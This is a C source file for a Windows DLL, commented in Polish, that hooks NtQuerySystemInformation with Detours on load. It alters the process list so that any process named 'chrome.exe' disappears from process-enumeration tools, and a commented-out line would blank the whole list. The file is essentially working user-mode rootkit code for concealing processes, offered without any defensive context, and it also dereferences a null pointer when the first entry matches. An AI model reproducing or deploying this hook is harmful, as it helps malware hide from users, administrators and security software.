#include <windows.h>
#include <detours.h>
#include "str.h"

typedef long (__stdcall *NtQuerySystemInformation_t)(int, PVOID, ULONG, PULONG);
NtQuerySystemInformation_t NtQuerySystemInformation;
NtQuerySystemInformation_t org_NtQuerySystemInformation;

DWORD *lastOffset = 0;

#define TARGET "chrome.exe" // proces który ukrywamy :)/>

long __stdcall hook_NtQuerySystemInformation( int mode, void *lpBuffer, ULONG c, PULONG d )
{
        long ret = org_NtQuerySystemInformation(mode,lpBuffer,c,d);
        if( mode == 5 )
        {
                SYSTEM_PROCESS_INFORMATION *s;
                s = (PSYSTEM_PROCESS_INFORMATION)lpBuffer;

                // ZeroMemory(lpBuffer,c); return ret; // HIDE THEM ALL!
                        
                while(1)
                {
                        char name[64]; ZeroMemory(name,64);
                        wcstombs(name,s->ImageName.Buffer,s->ImageName.Length);

                        if( strlen(name) < 2 )
                                strcpy(name,"[NULL]"); // proces bezczynności systemu, tak na prawdę nie ma nazwy żadnej :P/>

                        if( !strcmp(name,TARGET) )
                        {
                                *lastOffset += s->NextEntryOffset; // zwiększamy rozmiar struktury poprzedniego procesu o nasz
                                // tutaj można jeszcze pomyśleć o wyzerowaniu danych struktury naszego procesu
                        }
                        else lastOffset = (DWORD*)&s->NextEntryOffset; // tu musi być else jakby kilka procesów z rzędu miało tę samą nazwę co chcemy schować
                        

                        if (s->NextEntryOffset == 0) 
                        break; 

                        s = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)s)+ s->NextEntryOffset);
                }
        }
        return ret;
}

void test()
{
        NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("ntdll"),"NtQuerySystemInformation");

        if( NtQuerySystemInformation )
        {
                DetourFunction((PBYTE)NtQuerySystemInformation,(PBYTE)hook_NtQuerySystemInformation);
                __asm mov [ org_NtQuerySystemInformation ], eax
        }
}

BOOL WINAPI DllMain( HINSTANCE hInst, DWORD fdwReason, LPVOID lpvReserved) 
{
        if(fdwReason==1)
        {
                test();
        }
        return true;
}